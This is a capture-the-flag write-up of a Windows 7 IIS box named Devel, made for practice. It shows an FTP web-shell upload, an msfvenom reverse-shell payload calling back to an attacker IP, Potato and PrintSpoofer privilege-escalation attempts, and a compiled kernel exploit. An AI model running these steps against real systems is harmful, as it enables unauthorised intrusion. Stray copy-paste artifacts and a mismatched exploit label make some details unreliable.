---
description: >-
  Got root using MS10-015 kernel exploit after failing all Potato/UAC bypass
  attempts.
---

# Devel

### Summary

* Two open ports found: FTP (21) and HTTP (80), both hosted on IIS 7.5.
* Anonymous FTP login allowed with full read/write access.
* Uploaded a web shell through FTP and accessed it via the HTTP server.
* Gained reverse shell using a custom MSF payload.
* Manual enumeration revealed `SeImpersonatePrivilege` was enabled.
* Tried multiple potato variants and UAC bypass attempts—none worked.
* Eventually achieved SYSTEM access using an unpatched exploit (`MS10-015`) for Windows 7.



## 🧵 Let's Unpack

***

### Enumeration

```bash
sudo nmap -sC -sV -A -T4 -p- 10.10.10.5
```

```
yamlCopyEditPORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|   Files listed: aspnet_client, iisstart.htm, shelly.asp, shelly.aspx, welcome.png
| ftp-syst: 
|   SYST: Windows_NT

80/tcp open  http    Microsoft IIS httpd 7.5
| http-title: IIS7
| http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Potentially risky methods: TRACE
```

Notable findings:

* Anonymous FTP access with upload permissions
* IIS 7.5 running on port 80
* Accessible files via FTP and HTTP

***

### ️️⚙ Initial Foothold

Used the FTP upload capability to drop a reverse shell payload:

```bash
bashCopyEdit# Uploaded an ASPX web shell
put shell.aspx

# Accessed shell via browser and uploaded MSF payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9999 -f exe > shell.exe
```

Got a reverse shell back using `nc` listener:

```bash
bashCopyEditnc -lvnp 9999
```

***

### Privilege Escalation

Initial attempts:

```bash
whoami /priv
```

```
SeImpersonatePrivilege           Enabled
```

Tried classic Potato techniques:

```bash
godPotato.exe -cmd "cmd /c whoami"
PrintSpoofer32.exe -i -c "cmd /c C:\Users\Public\shell7777.exe"
```

But binary execution failed due to UAC restrictions and lack of PowerShell.

Tried UAC bypass:

```powershell
Start-Process powershell -Verb runAs "calc.exe"
```

No success.

Eventually, ran `systeminfo` and noticed the system was severely outdated (Windows 7), with no patching.

Compiled and used a known kernel exploit:

```bash
b# Exploit: https://www.exploit-db.com/exploits/40564
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32

# Uploaded and executed
exploit.exe
```

Boom—got SYSTEM access.

